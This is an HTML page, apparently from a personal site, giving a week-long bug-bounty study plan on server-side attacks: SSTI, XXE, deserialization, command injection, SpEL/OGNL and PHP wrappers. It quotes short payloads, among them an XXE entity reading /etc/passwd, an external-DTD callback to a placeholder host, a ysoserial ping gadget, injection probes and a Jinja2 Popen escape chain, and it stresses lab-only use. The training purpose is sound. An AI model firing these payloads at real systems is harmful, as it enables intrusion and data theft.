@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Week 07 — Server Code ULTIMATE · sayed_</title>
+<meta name="theme-color" content="#0c0d10">
+<link rel="icon" href="assets/favicon.ico" sizes="any">
+<link rel="icon" type="image/png" sizes="32x32" href="assets/favicon-32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="assets/favicon-16.png">
+<link rel="apple-touch-icon" sizes="180x180" href="assets/favicon-192.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&family=Source+Serif+4:opsz,wght@8..60,400;8..60,500;8..60,600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="css/plan.css">
+</head>
+<body data-week="07" data-wk="bbv2-07">
+<nav class="site-nav"><div class="inner">
+<a class="brand" href="index.html"><span class="logo-wrap"><span class="logo-orbit" aria-hidden="true"><i></i><i></i><i></i></span><img class="logo" src="/logo/logo.png" alt="sayed logo"></span><span class="mark">&gt;</span> sayed<span class="mark">_</span></a>
+<div class="nav-links">
+<a href="/index.html">Posts</a>
+<a href="/about.html">About</a>
+<a href="/keendork/keendork.html">Dorks</a>
+<a href="/bugbounty-plan/index.html">Plan</a>
+<a href="week06_db.html">← Prev</a><a class="current" href="week07_server.html">W07</a><a href="week08_fetch.html">Next →</a>
+</div>
+<div class="weekprog"><span id="pct">0%</span><div class="bar"><i id="bar"></i></div><button class="navbtn" id="expandBtn" onclick="toggleExpandAll()">Expand</button><button class="navbtn" onclick="resetWeek()">Reset</button></div>
+</div></nav>
+<main class="main"><div class="wrap">
+<header class="hero">
+<p class="kicker">Week 07 · Server Code ULTIMATE · 7 days × 180 min</p>
+<h1>Fingerprint first. Escape second. RCE stays in lab.</h1>
+<p class="lede">SSTI → XXE → deserialization → CMDi → SpEL/OGNL + actuators → wrappers Differentials. <code>{{7*7}}</code> math, blind DTD OOB, <code>ping CB</code> only. Critical = reproduce + stop + 24h report.</p>
+<div class="pills"><span class="tag tag--accent">lab-only RCE</span><span class="tag">OOB proof</span><span class="tag">ticks bbv2-07</span></div>
+</header>
+<div class="done-banner" id="doneBanner">🎉 Week complete — all boxes ticked. Move to Week 08.</div>
+
+<div class="day" id="day-1" data-day="1">
+<button class="day-head" onclick="toggleDay('day-1')"><span>Day 1 — SSTI fingerprint → escape → RCE (lab)</span><span class="dpill dpct">0%</span><span class="chev">▾</span></button>
+<div class="dbar"><i></i></div>
+<div class="day-body" id="body-1">
+<div class="timer">Real 180 min · math evaluated = template, not text</div>
+<ol class="timeline">
+<li class="t"><p class="t-head"><span class="t-time">0:00–0:15</span> Engine markers: {{ }} vs ${ } vs #{ } vs &lt;% %&gt;</p>
+<p class="t-act">List Jinja2/Twig <code>{{7*7}}</code>, JSP/SpEL <code>${7*7}</code>, Pug <code>#{7*7}</code>, ERB <code>&lt;%= 7*7 %&gt;</code>. Read <b>PortSwigger SSTI topic § fingerprint table ONLY</b>.</p>
+<div class="t-links"><a href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">PortSwigger: SSTI markers</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>4 markers + 1 example each cold.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">0:15–1:05</span> Detect → identify → escape: 7*7 per engine + tplmap confirm (lab)</p>
+<p class="t-act">Do <b>THM learnssti Task 2 (detect ${{&lt;%[%'"}}%) + Task 3 (identify {{7*7}} decision-tree) + Task 4 (Jinja2 syntax) + PortSwigger SSTI labs 1–2 IN ORDER</b>. Confirm with <b><code>tplmap -u 'URL?name=*7*7' --engine jinja2</code> detect-only (no --os-shell on live)</b>. Decision tree: 49 vs error vs literal.</p>
+<div class="t-links"><a href="https://tryhackme.com/room/learnssti" target="_blank" rel="noopener">THM: learnssti T2–T4</a><a href="https://portswigger.net/web-security/all-labs#server-side-template-injection" target="_blank" rel="noopener">All labs: SSTI filter (do basic first)</a><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">tplmap detect</a><a href="https://ctf.hacker101.com/" target="_blank" rel="noopener">Hacker101 CTF: SSTI flags (free)</a><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection" target="_blank" rel="noopener">HackTricks: per-engine rows</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>YT/X</h4><p>YT: <code>Orange Tsai Jinja2 SSTI RCE Black Hat</code> + <code>STOK SSTI to RCE bug bounty</code>. X: <code>SSTI RCE HackerOne min_faves:50</code>.</p><h4>Done-when</h4><p>Fingerprint log (marker × result) + tplmap detect.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">1:05–2:00</span> Orange Tsai Jinja2 RCE + Uber $10k profile-name case</p>
+<p class="t-act">Read <b>Orange Tsai research § <code>__class__.__mro__[1].__subclasses__()[401] → Popen</code> chain ONLY</b> + <b>THM learnssti Task 5 (RCE) + Task 8 (Uber $10k email-render) — escape step ONLY</b> + <b>H1 #125980 Uber SSTI FULL (profile-name → email render)</b>. Lab escape only.</p>
+<div class="t-links"><a href="https://blog.orange.tw/" target="_blank" rel="noopener">Orange Tsai: Jinja2 chain</a><a href="https://tryhackme.com/room/learnssti" target="_blank" rel="noopener">THM: RCE + Uber case</a><a href="https://hackerone.com/reports/125980" target="_blank" rel="noopener">H1 #125980 Uber SSTI</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Pattern</h4><p>Fingerprint → sandbox probe → <code>__mro__→Popen</code> → <code>ping CB</code> (never full shell on live).</p><h4>Done-when</h4><p>Chain diagram with escape node highlighted.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:00–2:35</span> Smarty/Pug/Jinja2 engine map + sandbox notes</p>
+<p class="t-act">Do <b>THM serversidetemplateinjection Task 4 (Smarty) + Task 5 (Pug) + Task 6 (Jinja2) + Task 7 (tplmap -u) ONLY</b>. Map marker × escape × tool-confirm.</p>
+<div class="t-links"><a href="https://tryhackme.com/room/serversidetemplateinjection" target="_blank" rel="noopener">THM: Smarty/Pug/Jinja2</a><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" target="_blank" rel="noopener">PATT: SSTI engines</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>3-engine map saved.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:35–3:00</span> Fingerprint-flow test + gaps</p>
+<p class="t-act">Narrate detect→identify→escape cold. Triage gaps (XXE next).</p>
+<div class="t-links"><a href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">PortSwigger: re-check</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Recited + map archived.</p></details></li>
+</ol>
+<ul class="chk">
+<li><input type="checkbox" id="w07d1c0"><label for="w07d1c0"><b>0:00–0:15</b> — 4 markers cold</label></li>
+<li><input type="checkbox" id="w07d1c1"><label for="w07d1c1"><b>0:15–1:05</b> — 7*7 fingerprints + tplmap detect</label></li>
+<li><input type="checkbox" id="w07d1c2"><label for="w07d1c2"><b>1:05–2:00</b> — Orange/Uber/H1 chain diagram</label></li>
+<li><input type="checkbox" id="w07d1c3"><label for="w07d1c3"><b>2:00–2:35</b> — 3-engine map</label></li>
+<li><input type="checkbox" id="w07d1c4"><label for="w07d1c4"><b>2:35–3:00</b> — flow recited + gaps</label></li>
+<li><input type="checkbox" id="w07d1c5"><label for="w07d1c5"><b>Proof</b> — fingerprints + map archived</label></li>
+</ul>
+<div class="mind"><b>Hunter mindset:</b> 49 = template. Literal = text.</div>
+<div class="day-actions"><button class="btn" onclick="copyDay('1')">📋 Copy day</button><button class="btn" onclick="openDayLinks('1')">🔗 Open links</button><button class="btn" onclick="resetDay('1')">↺ Reset</button></div>
+</div></div>
+
+<div class="day" id="day-2" data-day="2">
+<button class="day-head" onclick="toggleDay('day-2')"><span>Day 2 — XXE all vectors (in-band / blind / upload / SOAP)</span><span class="dpill dpct">0%</span><span class="chev">▾</span></button>
+<div class="dbar"><i></i></div>
+<div class="day-body" id="body-2">
+<div class="timer">Real 180 min · .xml/upload = XXE signal</div>
+<ol class="timeline">
+<li class="t"><p class="t-head"><span class="t-time">0:00–0:15</span> DOCTYPE/entity/DTD + blind-OOB shape</p>
+<p class="t-act">Write <code>&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;</code> + external-DTD callback shape. Read <b>PortSwigger XXE topic § in-band vs blind ONLY</b>.</p>
+<div class="t-links"><a href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">PortSwimmer: XXE shapes</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Shapes + 2 proof types cold.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">0:15–1:05</span> In-band → blind DTD → error-based (lab)</p>
+<p class="t-act">Do <b>PortSwigger XXE labs (in-band file-read → blind external-DTD → error-based) IN ORDER + THM xxe room (classic/blind/DTD) ONLY</b>. Blind: <b><code>&lt;!ENTITY % xxe SYSTEM "http://CB/evil.dtd"&gt;</code> + Collaborator poll, lab ONLY</b>. YT: <code>IppSec XXE blind DTD exfiltration</code>.</p>
+<div class="t-links"><a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files" target="_blank" rel="noopener">Lab: XXE retrieve files first</a><a href="https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection" target="_blank" rel="noopener">All labs: XXE filter</a><a href="https://tryhackme.com/room/xxe" target="_blank" rel="noopener">THM: xxe classic/blind</a><a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity" target="_blank" rel="noopener">HackTricks: DTD rows</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>3 proofs (read + OOB + error) in lab.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">1:05–2:00</span> SVG XXE + blind-OOB + SSRF-via-XXE pivot</p>
+<p class="t-act">Read <b>H1 #308448 XXE critical (SVG/DTD OOB) FULL — ENTITY + callback ONLY</b> + <b>1 SVG-upload XXE (Week 09 bridge) — upload vector ONLY</b>. Note SSRF pivot (<code>SYSTEM "http://169.254.169.254/"</code>) theory.</p>
+<div class="t-links"><a href="https://hackerone.com/reports/308448" target="_blank" rel="noopener">H1 #308448 XXE critical</a><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection" target="_blank" rel="noopener">PATT: SVG/upload rows</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>X</h4><p>Search <code>blind XXE OOB HackerOne</code> for DTD callback logs.</p><h4>Done-when</h4><p>ENTITY + DTD + pivot noted.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:00–2:35</span> Parser × vector matrix (XML/SVG/DOCX/SOAP)</p>
+<p class="t-act">Map vectors + <b>WSTG XML-injection headings ONLY</b>. Note Java/.NET parser differences for Week 12 pollution bridge.</p>
+<div class="t-links"><a href="https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection" target="_blank" rel="noopener">WSTG: XML injection</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Matrix saved.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:35–3:00</span> Blind-XXE proof test + gaps</p>
+<p class="t-act">Narrate DTD callback flow cold. Triage gaps (deser next).</p>
+<div class="t-links"><a href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">PortSwigger: re-check</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Recited + matrix archived.</p></details></li>
+</ol>
+<ul class="chk">
+<li><input type="checkbox" id="w07d2c0"><label for="w07d2c0"><b>0:00–0:15</b> — ENTITY + DTD shapes</label></li>
+<li><input type="checkbox" id="w07d2c1"><label for="w07d2c1"><b>0:15–1:05</b> — 3 XXE proofs (lab)</label></li>
+<li><input type="checkbox" id="w07d2c2"><label for="w07d2c2"><b>1:05–2:00</b> — SVG + OOB + pivot notes</label></li>
+<li><input type="checkbox" id="w07d2c3"><label for="w07d2c3"><b>2:00–2:35</b> — parser × vector matrix</label></li>
+<li><input type="checkbox" id="w07d2c4"><label for="w07d2c4"><b>2:35–3:00</b> — DTD flow + gaps</label></li>
+<li><input type="checkbox" id="w07d2c5"><label for="w07d2c5"><b>Proof</b> — proofs + matrix archived</label></li>
+</ul>
+<div class="mind"><b>Hunter mindset:</b> Upload + XML = parse it like attacker.</div>
+<div class="day-actions"><button class="btn" onclick="copyDay('2')">📋 Copy day</button><button class="btn" onclick="openDayLinks('2')">🔗 Open links</button><button class="btn" onclick="resetDay('2')">↺ Reset</button></div>
+</div></div>
+
+<div class="day" id="day-3" data-day="3">
+<button class="day-head" onclick="toggleDay('day-3')"><span>Day 3 — Deserialization (gadgets + OOB, lab only)</span><span class="dpill dpct">0%</span><span class="chev">▾</span></button>
+<div class="dbar"><i></i></div>
+<div class="day-body" id="body-3">
+<div class="timer">Real 180 min · never brute RCE on prod</div>
+<ol class="timeline">
+<li class="t"><p class="t-head"><span class="t-time">0:00–0:15</span> Magic bytes: Java / PHP / Python / .NET</p>
+<p class="t-act">List <code>rO0 (Java) + O:8 (PHP) + pickle \x80 + ViewState</code>. Read <b>PortSwigger deserialization § identification ONLY</b>.</p>
+<div class="t-links"><a href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">PortSwigger: deser identify</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>4 markers + lib map started.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">0:15–1:05</span> Labs: identify → gadget → OOB ping (lab, no detonation)</p>
+<p class="t-act">Do <b>PortSwigger deser labs (identify + OOB) + THM deserialization room ONLY</b>. Generate <b><code>ysoserial CommonsCollections7 'ping CB.oast.fun' | base64</code> OOB ONLY (no RCE)</b>. <b>HackTricks deser § per-language gadgets READ ONLY</b>.</p>
+<div class="t-links"><a href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">PortSwigger: deser labs</a><a href="https://portswigger.net/web-security/all-labs#insecure-deserialization" target="_blank" rel="noopener">All labs: deser filter</a><a href="https://tryhackme.com/room/deserialization" target="_blank" rel="noopener">THM: deserialization</a><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial OOB only</a><a href="https://book.hacktricks.xyz/pentesting-web/deserialization" target="_blank" rel="noopener">HackTricks: gadgets</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>X</h4><p>Search <code>deserialization gadget bounty</code> for lib→CVE match stories.</p><h4>Done-when</h4><p>Lib map + OOB ping (lab), no detonation.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">1:05–2:00</span> unserialize RCE + pickle cases (which gadget fired)</p>
+<p class="t-act">Read <b>1 PHP unserialize + 1 Python pickle — gadget name + sink ONLY</b>. Note why it patches fastest (RCE + wormable).</p>
+<div class="t-links"><a href="https://book.hacktricks.xyz/pentesting-web/deserialization" target="_blank" rel="noopener">HackTricks: unserialize/pickle</a><a href="https://pentester.land/writeups" target="_blank" rel="noopener">pentester.land: deser cases</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>2 gadget notes + patch-urgency line.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:00–2:35</span> Lib map + version→CVE match</p>
+<p class="t-act">Map libs (CommonsCollections, Jackson, node-serialize, pickle) → <b>NVD search 1 candidate (no exploit)</b>.</p>
+<div class="t-links"><a href="https://nvd.nist.gov/" target="_blank" rel="noopener">NVD: lib CVE match</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Map + 1 CVE candidate.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:35–3:00</span> Patch-fast test + gaps</p>
+<p class="t-act">Explain why deser patches fastest. Triage gaps (CMDi next).</p>
+<div class="t-links"><a href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">PortSwigger: re-check</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Recited + map archived.</p></details></li>
+</ol>
+<ul class="chk">
+<li><input type="checkbox" id="w07d3c0"><label for="w07d3c0"><b>0:00–0:15</b> — 4 markers + lib map</label></li>
+<li><input type="checkbox" id="w07d3c1"><label for="w07d3c1"><b>0:15–1:05</b> — labs + OOB ping (lab, no boom)</label></li>
+<li><input type="checkbox" id="w07d3c2"><label for="w07d3c2"><b>1:05–2:00</b> — 2 gadget notes</label></li>
+<li><input type="checkbox" id="w07d3c3"><label for="w07d3c3"><b>2:00–2:35</b> — lib→CVE match (no exploit)</label></li>
+<li><input type="checkbox" id="w07d3c4"><label for="w07d3c4"><b>2:35–3:00</b> — patch-fast + gaps</label></li>
+<li><input type="checkbox" id="w07d3c5"><label for="w07d3c5"><b>Proof</b> — map + OOB archived</label></li>
+</ul>
+<div class="mind"><b>Hunter mindset:</b> OOB ping proves sink. Detonation proves ban.</div>
+<div class="day-actions"><button class="btn" onclick="copyDay('3')">📋 Copy day</button><button class="btn" onclick="openDayLinks('3')">🔗 Open links</button><button class="btn" onclick="resetDay('3')">↺ Reset</button></div>
+</div></div>
+
+<div class="day" id="day-4" data-day="4">
+<button class="day-head" onclick="toggleDay('day-4')"><span>Day 4 — Command injection / RCE shell-out sinks</span><span class="dpill dpct">0%</span><span class="chev">▾</span></button>
+<div class="dbar"><i></i></div>
+<div class="day-body" id="body-4">
+<div class="timer">Real 180 min · user input → shell-out = RCE</div>
+<ol class="timeline">
+<li class="t"><p class="t-head"><span class="t-time">0:00–0:15</span> Separators + blind-confirm shapes</p>
+<p class="t-act">List <code>; | && $() ``</code> + <code>sleep/ping/Collaborator</code> confirms. Read <b>PortSwigger CMDi topic § direct vs blind ONLY</b> + <b>WSTG command-injection § objectives ONLY</b>.</p>
+<div class="t-links"><a href="https://portswigger.net/web-security/os-command-injection" target="_blank" rel="noopener">PortSwigger: CMDi shapes</a><a href="https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection" target="_blank" rel="noopener">WSTG: CMDi</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Separators + 3 confirms cold.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">0:15–1:05</span> Direct → blind time → OOB (lab)</p>
+<p class="t-act">Do <b>PortSwigger CMDi labs (direct + blind-time + OOB) + THM commandinjection room ONLY</b>. Proofs: <code>;id</code> → <code>;sleep 5</code> (baseline first) → <code>;ping -c1 CB</code>. <b>PATT CMDi rows + commix <code>--batch --os-cmd="whoami"</code> on LAB ONLY</b>.</p>
+<div class="t-links"><a href="https://portswigger.net/web-security/os-command-injection/lab-simple" target="_blank" rel="noopener">Lab: CMDi simple first</a><a href="https://portswigger.net/web-security/all-labs#os-command-injection" target="_blank" rel="noopener">All labs: CMDi filter</a><a href="https://tryhackme.com/room/commandinjection" target="_blank" rel="noopener">THM: CMDi</a><a href="https://github.com/commixproject/commix" target="_blank" rel="noopener">commix batch (lab)</a><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" target="_blank" rel="noopener">PATT: CMDi rows</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>3 proofs with baselines (lab).</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">1:05–2:00</span> Image-convert + ping-host RCE cases</p>
+<p class="t-act">Read <b>1 image-convert (ImageMagick/ExifTool) + 1 ping-host utility RCE — sink + separator ONLY</b>. Note language contexts (PHP/Python/Node/Java) per HackTricks.</p>
+<div class="t-links"><a href="https://book.hacktricks.xyz/pentesting-web/command-injection" target="_blank" rel="noopener">HackTricks: sink contexts</a><a href="https://pentester.land/writeups" target="_blank" rel="noopener">pentester.land: convert/host RCE</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Stacks</h4><p>convert/export/mail/ping features = shell-out smells. CVE-2016-3714/2021-22204 pattern (Week 09 bridge).</p><h4>Done-when</h4><p>2 sink notes with separators.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:00–2:35</span> Sink map + filter table (lab)</p>
+<p class="t-act">Map sinks + bypasses (space alternatives <code>$IFS</code>, quotes, encoding). <b>SecLists 5-line drill, lab only.</b></p>
+<div class="t-links"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" target="_blank" rel="noopener">PATT: filter rows</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Map + table saved.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:35–3:00</span> Blind-CMDi flow test + gaps</p>
+<p class="t-act">Narrate blind confirm (baseline → sleep → OOB). Triage gaps (Spring next).</p>
+<div class="t-links"><a href="https://portswigger.net/web-security/os-command-injection" target="_blank" rel="noopener">PortSwigger: re-check</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Recited + map archived.</p></details></li>
+</ol>
+<ul class="chk">
+<li><input type="checkbox" id="w07d4c0"><label for="w07d4c0"><b>0:00–0:15</b> — separators + confirms</label></li>
+<li><input type="checkbox" id="w07d4c1"><label for="w07d4c1"><b>0:15–1:05</b> — 3 proofs with baselines (lab)</label></li>
+<li><input type="checkbox" id="w07d4c2"><label for="w07d4c2"><b>1:05–2:00</b> — 2 sink notes</label></li>
+<li><input type="checkbox" id="w07d4c3"><label for="w07d4c3"><b>2:00–2:35</b> — sink + filter map</label></li>
+<li><input type="checkbox" id="w07d4c4"><label for="w07d4c4"><b>2:35–3:00</b> — blind flow + gaps</label></li>
+<li><input type="checkbox" id="w07d4c5"><label for="w07d4c5"><b>Proof</b> — proofs + map archived</label></li>
+</ul>
+<div class="mind"><b>Hunter mindset:</b> Baseline or it is network jitter.</div>
+<div class="day-actions"><button class="btn" onclick="copyDay('4')">📋 Copy day</button><button class="btn" onclick="openDayLinks('4')">🔗 Open links</button><button class="btn" onclick="resetDay('4')">↺ Reset</button></div>
+</div></div>
+
+<div class="day" id="day-5" data-day="5">
+<button class="day-head" onclick="toggleDay('day-5')"><span>Day 5 — EL / SpEL / OGNL + Spring Actuators</span><span class="dpill dpct">0%</span><span class="chev">▾</span></button>
+<div class="dbar"><i></i></div>
+<div class="day-body" id="body-5">
+<div class="timer">Real 180 min · stack tells payload</div>
+<ol class="timeline">
+<li class="t"><p class="t-head"><span class="t-time">0:00–0:15</span> SpEL ${} vs OGNL %{} + actuator paths</p>
+<p class="t-act">List <code>${T(java.lang.Runtime)...}</code> + <code>%{...}</code> + <code>/actuator/env/mappings/beans/heapdump</code>. Read <b>HackTricks Spring actuators § paths ONLY</b>.</p>
+<div class="t-links"><a href="https://book.hacktricks.xyz/pentesting-web/spring-boot-actuators" target="_blank" rel="noopener">HackTricks: actuator paths</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Syntaxes + 4 paths cold.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">0:15–1:05</span> Actuator exposure + SpEL eval (lab)</p>
+<p class="t-act">Probe <b><code>/actuator/*</code> (GET only, lab)</b> + SpEL <code>${7*7}</code> eval. Map exposed endpoints (mappings/env/beans). <b>nuclei <code>CVE-2022-22965.yaml + http/exposures/spring/</code> on LAB ONLY</b>.</p>
+<div class="t-links"><a href="https://book.hacktricks.xyz/pentesting-web/spring-boot-actuators" target="_blank" rel="noopener">HackTricks: exposure drill</a><a href="https://github.com/projectdiscovery/nuclei" target="_blank" rel="noopener">nuclei: spring templates (lab)</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Actuator map + 1 eval result (lab).</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">1:05–2:00</span> Spring4Shell pattern + actuator-leak case</p>
+<p class="t-act">Read <b>NVD CVE-2022-22965 § description + affected versions ONLY</b> + <b>1 actuator-leak (env keys / heapdump) — exposed path + key type ONLY</b>. YT: <code>Spring4Shell CVE-2022-22965 exploit explained</code>.</p>
+<div class="t-links"><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-22965" target="_blank" rel="noopener">NVD: Spring4Shell</a><a href="https://pentester.land/writeups" target="_blank" rel="noopener">pentester.land: actuator leak</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Pattern</h4><p>Actuator map → SpEL inject → shell. Version log → advisory match (Week 02 skill pays here).</p><h4>Done-when</h4><p>Pattern + version-check noted.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:00–2:35</span> Struts2/OGNL CVE match against your stack log</p>
+<p class="t-act">Check your Week-02 version log for Java/Spring/Struts. <b>NVD 1-candidate match, no exploit.</b> Note Text4Shell/SnakeYAML patterns by name only.</p>
+<div class="t-links"><a href="https://nvd.nist.gov/" target="_blank" rel="noopener">NVD: stack match</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Match result (yes/no + versions).</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:35–3:00</span> Actuator-paths test + gaps</p>
+<p class="t-act">Recite 4 paths + SpEL shape. Triage gaps (wrappers next).</p>
+<div class="t-links"><a href="https://book.hacktricks.xyz/pentesting-web/spring-boot-actuators" target="_blank" rel="noopener">HackTricks: re-check</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Recited + map archived.</p></details></li>
+</ol>
+<ul class="chk">
+<li><input type="checkbox" id="w07d5c0"><label for="w07d5c0"><b>0:00–0:15</b> — syntaxes + paths</label></li>
+<li><input type="checkbox" id="w07d5c1"><label for="w07d5c1"><b>0:15–1:05</b> — actuator map + eval (lab)</label></li>
+<li><input type="checkbox" id="w07d5c2"><label for="w07d5c2"><b>1:05–2:00</b> — Spring4Shell + leak patterns</label></li>
+<li><input type="checkbox" id="w07d5c3"><label for="w07d5c3"><b>2:00–2:35</b> — stack CVE match (no exploit)</label></li>
+<li><input type="checkbox" id="w07d5c4"><label for="w07d5c4"><b>2:35–3:00</b> — paths recited + gaps</label></li>
+<li><input type="checkbox" id="w07d5c5"><label for="w07d5c5"><b>Proof</b> — map + match archived</label></li>
+</ul>
+<div class="mind"><b>Hunter mindset:</b> Exposed actuator = free recon.</div>
+<div class="day-actions"><button class="btn" onclick="copyDay('5')">📋 Copy day</button><button class="btn" onclick="openDayLinks('5')">🔗 Open links</button><button class="btn" onclick="resetDay('5')">↺ Reset</button></div>
+</div></div>
+
+<div class="day" id="day-6" data-day="6">
+<button class="day-head" onclick="toggleDay('day-6')"><span>Day 6 — Wrappers / filters + parser differentials</span><span class="dpill dpct">0%</span><span class="chev">▾</span></button>
+<div class="dbar"><i></i></div>
+<div class="day-body" id="body-6">
+<div class="timer">Real 180 min · system disagrees with itself = bug</div>
+<ol class="timeline">
+<li class="t"><p class="t-head"><span class="t-time">0:00–0:15</span> php:// wrappers + double-encode/unicode</p>
+<p class="t-act">List <code>filter/convert.base64-encode + zip + data + expect</code> + <code>%252e + unicode</code>. Read <b>HackTricks LFI § wrappers table ONLY</b>.</p>
+<div class="t-links"><a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion" target="_blank" rel="noopener">HackTricks: wrapper table</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Wrappers + 2 encodings cold.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">0:15–1:05</span> Wrapper matrix on lab (filter/zip/data + encodings)</p>
+<p class="t-act">Test <b><code>php://filter/convert.base64-encode/resource=index</code> source disclosure + double-encode + unicode (lab)</b>. Log front-vs-back disagreements. YT: <code>LiveOverflow Breaking Parser Logic</code> — differential mindset segment.</p>
+<div class="t-links"><a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion" target="_blank" rel="noopener">HackTricks: wrapper drill</a><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" target="_blank" rel="noopener">PATT: wrapper rows</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Matrix (wrapper × bypass × result).</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">1:05–2:00</span> Parser-0day + wrapper source-disclosure cases</p>
+<p class="t-act">Read <b>1 parser-differential 0day summary (SVG vs XML, UTF-7, polyglot — disagreement point ONLY)</b> + <b>1 wrapper source-disclosure (config key found) — wrapper used ONLY</b>.</p>
+<div class="t-links"><a href="https://pentester.land/writeups" target="_blank" rel="noopener">pentester.land: parser/wrapper</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Surprise</h4><p>Parser differentials are Week 08 smuggling/cache fuel — same disagreement class, new protocol.</p><h4>Done-when</h4><p>2 disagreement points noted.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:00–2:35</span> Differential log + bypass table</p>
+<p class="t-act">Consolidate + note Content-Type tricks (<code>image/svg+xml</code> as XML).</p>
+<div class="t-links"><a href="https://github.com/su6osec/Bug-Bounty-Hunting-Methodology-2026" target="_blank" rel="noopener">HuntBook: differential log</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Log + table saved.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:35–3:00</span> Wrapper use-case test + gaps</p>
+<p class="t-act">Explain your best wrapper end-to-end. Triage gaps (live hunt next).</p>
+<div class="t-links"><a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion" target="_blank" rel="noopener">HackTricks: re-check</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Recited + matrix archived.</p></details></li>
+</ol>
